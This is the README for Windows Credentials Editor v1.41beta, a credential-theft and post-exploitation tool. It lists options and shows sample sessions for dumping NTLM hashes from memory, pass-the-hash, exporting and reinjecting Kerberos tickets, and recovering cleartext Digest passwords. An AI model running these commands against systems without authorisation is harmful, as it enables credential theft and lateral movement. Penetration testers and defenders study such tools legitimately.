Windows Credentials Editor v1.41beta (Universal Binary)
(c) 2010, 2011, 2012, 2013 Amplia Security, Hernan Ochoa
written by: hernan@ampliasecurity.com
http://www.ampliasecurity.com
-------------------------------------------------------------

Why is this a "Universal Binary" ?
---------------------------------

The wce.exe file in this package is a wrapper that detects at runtime if it
is running on a 32 bit or 64 bit version of Windows, dumps the appropiate version of WCE and
executes it.

This "universal binary" has many practical advantages; among others, it saves the user from 
having to use two different .exe files (WCE for 32bit systems and WCE for 64bit systems) and from
manually or programmatically detecting which one should be used. This makes scripting easier, for example, 
to use wce.exe against massive amounts of heterogenous systems whose architecture is unknown. 
The price to pay is a bigger executable file, which should not be an issue.

(Thank you Kevin Mitnick for the idea!)

Abstract
----------

Windows Credentials Editor (WCE) v1.41beta allows you to

NTLM authentication:

* List logon sessions and add, change, list and delete associated credentials (e.g.: LM/NT hashes)
* Perform pass-the-hash on Windows natively
* Obtain NT/LM hashes from memory (from interactive logons, services, remote desktop connections, etc.) which can be
used to authenticate to other systems. WCE can perform this task without injecting code, just by reading and decrypting information stored in Windows internal memory structures. It also has the capability to automatically switch to code injection when the aforementioned method cannot be performed

Kerberos authentication:

* Dump Kerberos tickets (including the TGT) stored in Windows machines
* Reuse/Load those tickets on another Windows machines, to authenticate to other systems and services
* Reuse/Load those tickets on *Unix machines, to authenticate to other systems and services

Digest Authentication:

* Obtain cleartext passwords entered by the user when logging into a Windows system, and stored by the Windows Digest Authentication security package


Supported Platforms
-------------------
Windows Credentials Editor supports Windows XP, 2003, Vista, 7, 2008 and 8.


Requirements
-------------
This tool requires administrator privileges to dump and add/delete/change NTLM credentials, and to dump cleartext passwords stored by the Windows Digest Authentication security package.

Kerberos tickets can be obtained as a normal user although administrator privileges might be required to obtain session keys depending on the system's configuration.

Please remember this is an attack and post-exploitation tool.

Options
--------
Windows Credentials Editor provides the following options:

Options:  
	-l		List logon sessions and NTLM credentials (default).
	-s		Changes NTLM credentials of current logon session.
			Parameters: <UserName>:<DomainName>:<LMHash>:<NTHash>.
	-r		Lists logon sessions and NTLM credentials indefinitely.
			Refreshes every 5 seconds if new sessions are found.
			Optional: -r<refresh interval>.
	-c		Run <cmd> in a new session with the specified NTLM credentials.
			Parameters: <cmd>.
	-e		Lists logon sessions NTLM credentials indefinitely.
			Refreshes every time a logon event occurs.
	-o		saves all output to a file.
			Parameters: <filename>.
	-i		Specify LUID instead of use current logon session.
			Parameters: <luid>.
	-d		Delete NTLM credentials from logon session.
			Parameters: <luid>.
	-a		Use Addresses.
			Parameters: <addresses>
	-f		Force 'safe mode'.
        -g              Generate LM & NT Hash.
                        Parameters: <password>.
        -K              Dump Kerberos tickets to file (unix & 'windows wce' form
at)
        -k              Read Kerberos tickets from file and insert into Windows
cache
	-w		Dump cleartext passwords stored by the digest authentication package
	-v		verbose output.

Examples:

	* List current logon sessions

C:\>wce -l
WCE v1.41beta (Windows Credentials Editor) - (c) 2010-2013 Amplia Security - by Hernan Ochoa (hernan@ampliasecurity.com)
Use -h for help.

meme:meme:11111111111111111111111111111111:11111111111111111111111111111111

	* List current logon sessions with verbose output enabled

C:\>wce -l -v
WCE v1.41beta (Windows Credentials Editor) - (c) 2010-2013 Amplia Security - by Hernan Ochoa (hernan@ampliasecurity.com)
Use -h for help.

Current Logon Session LUID: 00064081h
Logon Sessions Found: 8
WIN-REK2HG6EBIS\auser:NTLM
        LUID:0006409Fh
WIN-REK2HG6EBIS\auser:NTLM
        LUID:00064081h
NT AUTHORITY\ANONYMOUS LOGON:NTLM
        LUID:00019137h
NT AUTHORITY\IUSR:Negotiate
        LUID:000003E3h
NT AUTHORITY\LOCAL SERVICE:Negotiate
        LUID:000003E5h
WORKGROUP\WIN-REK2HG6EBIS$:Negotiate
        LUID:000003E4h
\:NTLM
        LUID:0000916Ah
WORKGROUP\WIN-REK2HG6EBIS$:NTLM
        LUID:000003E7h

00064081:meme:meme:11111111111111111111111111111111:11111111111111111111111111111111	

	* Change NTLM credentials associated with current logon session

C:\>wce -s auser:adomain:99999999999999999999999999999999:99999999999999999999999999999999
WCE v1.41beta (Windows Credentials Editor) - (c) 2010-2013 Amplia Security - by Hernan Ochoa (hernan@ampliasecurity.com)
Use -h for help.

Changing NTLM credentials of current logon session (00064081h) to:
Username: auser
domain: admin
LMHash: 99999999999999999999999999999999
NTHash: 99999999999999999999999999999999
NTLM credentials successfully changed!

	* Add/Change NTLM credentials of a logon session (not the current one)

C:\>wce -i 3e5 -s auser:adomain:99999999999999999999999999999999:99999999999999999999999999999999 
WCE v1.41beta (Windows Credentials Editor) - (c) 2010-2013 Amplia Security - by Hernan Ochoa (hernan@ampliasecurity.com)
Use -h for help.

Changing NTLM credentials of logon session 000003E5h to:
Username: auser
domain: admin
LMHash: 99999999999999999999999999999999
NTHash: 99999999999999999999999999999999
NTLM credentials successfully changed!

	* Delete NTLM credentials associated with a logon session

C:\>wce -d 3e5
WCE v1.41beta (Windows Credentials Editor) - (c) 2010-2013 Amplia Security - by Hernan Ochoa (hernan@ampliasecurity.com)
Use -h for help.

NTLM credentials successfully deleted!

	* Run WCE indefinitely, waiting for new credentials/logon sessions.
	Refresh is performed every time a logon event is registered in the Event Log.

C:\>wce -e

	* Run WCE indefinitely, waiting for new credentials/logon sessions
	Refresh is every 5 seconds by default.

C:\>wce -r

	* Run WCE indefinitely, waiting for new credentials/logon sessions, but refresh every 1 second (by default wce refreshes very 5 seconds)

C:\>wce -r5


	* Generate LM & NT Hash.
     
C:\>wce -g test
WCE v1.41beta (Windows Credentials Editor) - (c) 2010-2013 Amplia Security - by Hernan Ochoa (hernan@ampliasecurity.com)
Use -h for help.

Password:   test
Hashes:     01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537

	* Dump Kerberos tickets to file (unix & 'windows wce' format)      

C:\>wce -K
WCE v1.41beta (Windows Credentials Editor) - (c) 2010-2013 Amplia Security - by Hernan Ochoa (hernan@ampliasecurity.com)
Use -h for help.

Converting and saving TGT in UNIX format to file wce_ccache...
Converting and saving tickets in Windows WCE Format to file wce_krbtkts..
5 kerberos tickets saved to file 'wce_ccache'.
5 kerberos tickets saved to file 'wce_krbtkts'.
Done!

	* Read Kerberos tickets from file and insert into Windows cache

C:\>wce -k
WCE v1.41beta (Windows Credentials Editor) - (c) 2010-2013 Amplia Security - by Hernan Ochoa (hernan@ampliasecurity.com)
Use -h for help.

Reading kerberos tickets from file 'wce_krbtkts'...
5 kerberos tickets were added to the cache.
Done!

       * Dump cleartext passwords stored by the Digest Authentication package

C:\>wce -w
WCE v1.41beta (Windows Credentials Editor) - (c) 2010,2011,2012,2013 Amplia Security - by Hernan Ochoa (hernan@ampliasecurity.com)
Use -h for help.

test\MYDOMAIN:mypass1234
NETWORK SERVICE\WORKGROUP:test



Additional Information
----------------------

* http://www.ampliasecurity.com/research.html
* http://www.ampliasecurity.com/research/wcefaq.html
* http://www.ampliasecurity.com/research/WCE_Internals_RootedCon2011_ampliasecurity.pdf
* http://www.ampliasecurity.com/research/wce12_uba_ampliasecurity_eng.pdf


